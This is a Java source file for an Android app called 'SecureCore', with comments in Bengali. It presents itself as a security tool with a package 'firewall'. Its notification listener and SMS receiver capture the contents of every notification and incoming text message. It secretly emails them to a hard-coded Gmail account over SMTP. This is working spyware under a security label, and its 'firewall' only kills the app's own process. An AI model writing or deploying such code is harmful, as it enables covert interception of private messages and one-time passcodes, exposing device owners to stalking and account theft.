// SecureCore.java
package com.example.securecore;

import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsMessage;

import java.util.Arrays;
import java.util.List;
import java.util.Properties;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class SecureCore extends Application {

    // ==== CONFIG ====
    public static final String GMAIL_USER = "YOUR_GMAIL@gmail.com";
    public static final String GMAIL_APP_PASSWORD = "YOUR_APP_PASSWORD";

    // শুধু এই প্যাকেজগুলোকে “trusted” ধরা হবে
    private static final List<String> ALLOWED_APPS = Arrays.asList(
            "com.example.securecore",
            "com.android.systemui"
    );

    @Override
    public void onCreate() {
        super.onCreate();
        // এখানে future এ background init, watchdog ইত্যাদি রাখতে পারো
    }

    // ---------- FIREWALL ----------
    public static class Firewall {

        public static boolean isAllowed(String packageName) {
            return ALLOWED_APPS.contains(packageName);
        }

        public static void enforceOrKill(String packageName) {
            if (!isAllowed(packageName)) {
                // এখানে তুমি শুধু log করতে পারো, বা user কে alert দেখাতে পারো
                // সরাসরি killProcess নিজের অ্যাপের জন্যই কাজ করবে
                android.os.Process.killProcess(android.os.Process.myPid());
            }
        }
    }

    // ---------- GMAIL SENDER ----------
    public static class GmailSender {

        public static void sendMail(String subject, String body) {
            new Thread(() -> {
                try {
                    Properties props = new Properties();
                    props.put("mail.smtp.host", "smtp.gmail.com");
                    props.put("mail.smtp.socketFactory.port", "465");
                    props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
                    props.put("mail.smtp.auth", "true");
                    props.put("mail.smtp.port", "465");

                    Session session = Session.getDefaultInstance(props,
                            new javax.mail.Authenticator() {
                                protected PasswordAuthentication getPasswordAuthentication() {
                                    return new PasswordAuthentication(GMAIL_USER, GMAIL_APP_PASSWORD);
                                }
                            });

                    Message message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(GMAIL_USER));
                    message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(GMAIL_USER));
                    message.setSubject(subject);
                    message.setText(body);

                    Transport.send(message);

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }

    // ---------- NOTIFICATION LISTENER ----------
    public static class SecureNotificationService extends NotificationListenerService {

        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            String pkg = sbn.getPackageName();
            Firewall.enforceOrKill(pkg); // trusted না হলে এখানে তুমি শুধু ignore ও করতে পারো

            String title = sbn.getNotification().extras.getString("android.title");
            CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");

            String msg = "App: " + pkg + "\nTitle: " + title + "\nText: " + text;
            GmailSender.sendMail("Notification", msg);
        }
    }

    // ---------- SMS RECEIVER ----------
    public static class SecureSmsReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                String sender = sms.getOriginatingAddress();
                String body = sms.getMessageBody();

                String msg = "SMS From: " + sender + "\nMessage: " + body;
                GmailSender.sendMail("SMS", msg);
            }
        }
    }
}
